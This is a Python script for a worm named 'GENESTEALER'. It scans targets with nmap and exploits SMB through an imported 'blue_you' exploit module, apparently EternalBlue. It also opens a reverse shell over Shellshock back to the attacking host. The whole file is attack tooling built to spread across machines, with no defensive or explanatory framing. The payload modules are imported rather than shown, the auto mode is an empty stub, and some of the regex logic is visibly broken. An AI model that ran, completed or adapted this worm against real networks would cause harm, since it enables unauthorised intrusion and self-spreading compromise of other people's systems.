#!/usr/bin/env python3

import argparse
import pathlib
import re
from blue_you import exploit
from ipaddress import ip_address, ip_network
from pprint import pprint
from scanner import scanner
from shocker import shockshell
from subprocess import check_output

# SMB ports are 139 & 445, so look for a 3 digit number
smb_finder = re.compile("([0-9]{3}\/tcp)\s+(open)")
# Shellshock needs port 80
web_finder = re.compile("([0-9]{2}\/tcp)\s+(open)")

def main():
    parser = argparse.ArgumentParser(prog="GENESTEALER")
    parser.add_argument('mode',
                        choices=["manual", "auto"],
                        help="Whether to expect specified targets or not")
    parser.add_argument('--target',
                        action='extend',
                        nargs='+',
                        help="Initial target for worm (only for manual attack mode)",
                        type=ip_address)

    args = parser.parse_args()

    if args.mode == 'manual' and args.target is None:
        parser.error("Manual mode specified but no target given!")
    else:
        nmap = scanner()
        if args.mode == 'manual':
            for victim_ip in args.target:
                print(f"Manual attack started against {victim_ip}")
                curr_box = nmap.get_self_ip()
                # print scan output
                print("Scanning target with nmap...")
                vic_info = nmap.identify_ports(str(victim_ip))
                pprint(vic_info)
                if len(smb_finder.findall(vic_info)) == 2:
                    # Don't need to check the ports since we only scan for 3
                    print(f"Smb ports running on {victim_ip}!!")
                    # Run smbclient to enumerate pipes
                    pipe_detector = re.compile('(A-z)+')
                    smbclient_cmd = ['smbclient', '-L', f'\\\\{victim_ip}']
                    smbclient_cmd_alt = ['/tmp/.smbclient', '-L', f'\\\\{victim_ip}']
                    try:
                        pipe_names = check_output(smbclient_cmd)
                    except:
                        pipe_names = check_output(smbclient_cmd_alt)
                    finally:
                        pipes = pipe_detector.findall(pipe_names)
                    for pipe in pipes:
                        try:
                            exploit(victim_ip, pipe)
                        except:
                            continue
                elif len(web_finder.findall(vic_info)) == 1:
                    print(f"Web server found running on {victim_ip}!!")
                    shockshell('reverse', victim_ip, 40000, curr_box)
                else:
                    print("Necessary ports not found on target")
                    print(f"Attack on {victim_ip} failed :(")
        else:
            print("Auto attack against network")
            curr_box = nmap.get_self_ip()
            print("Identifying targets...")
            pass

if __name__ == '__main__':
    main()
